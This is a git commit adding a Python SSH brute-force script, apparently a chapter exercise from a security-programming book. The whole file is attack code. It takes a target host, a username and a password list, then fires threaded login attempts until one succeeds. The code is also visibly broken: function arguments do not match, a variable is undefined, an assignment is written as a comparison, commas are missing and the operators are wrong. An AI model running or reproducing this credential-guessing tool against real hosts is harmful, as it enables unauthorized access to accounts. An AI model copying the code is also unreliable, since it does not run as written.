c673001f272c878ff1012410bff9f2a09cda9538
RAVE-V <ravishankerm9@gmail.com>
2018-12-28 00:12:08 +0530

    Ssh brute2

---
+++ Chapter 2/ssh_brute/ssh_brute2.py
@@ -0,0 +1,62 @@
+import pxssh
+import optparse
+import time
+from threading import *
+
+maxConnnections=5
+connection_lock=BoundedSemaphore(value=maxConnnections)
+Found=False
+fails=0
+
+def send_command():
+    pass
+
+def connect(host,user,Password):
+    global Found
+    global fails
+    try:
+        s=pxssh.pxssh()
+        s.login(host,user,Password)
+        print('[+] Password Found: '+Password)
+        Found=True
+    except Exception,e:
+        if 'read_nonblocking' in str(e):
+            fails+=1
+            time.sleep(5)
+            connect(host,user,Password,False)
+        elif 'synchronize with original prompt' in str(e):
+            time.sleep(1)
+            connect(host,user,Password,False)
+        finally:
+            if release:
+                connection_lock.release()
+
+def main():
+    parser==optparser.OptionParser("usage%prog" +"-H <Target Host> -u <user> -P <Password List>")
+    parser.add_option('-H',dest='tgthost',type='string',help='Specify target host')
+    parser.add_option('-u' dest='user',type='string',help='Specify the user')
+    parser.add_option('-P' dest='passwdFile',type='string',help='Specify the Password')
+    (options,args)=parser.parse_args()
+    host=options.tgthost
+    passwdFile=options.passwdFile
+    user=options.user
+    if host==None | passwdFile==None | user==None :
+        print(parser.usage)
+        exit(0)
+    file=open(passwdFile,'r')
+    for line in file.readlines():
+        if Found:
+            print('[*] Exiting Password Found')
+            exit(0)
+        if fails>5:
+            print('[!] Exiting: Too many Socket Timeouts')
+            exit(0)
+        connection_lock.acquire()
+        Password=line.strip('\r').strip('\n')
+        print('[-] Testing: '+ Password)
+        t=Thread(target=connect,args=(host,user,Password,True))
+        child=t.start()
+
+
+if __name__=='__main__':
+    main()
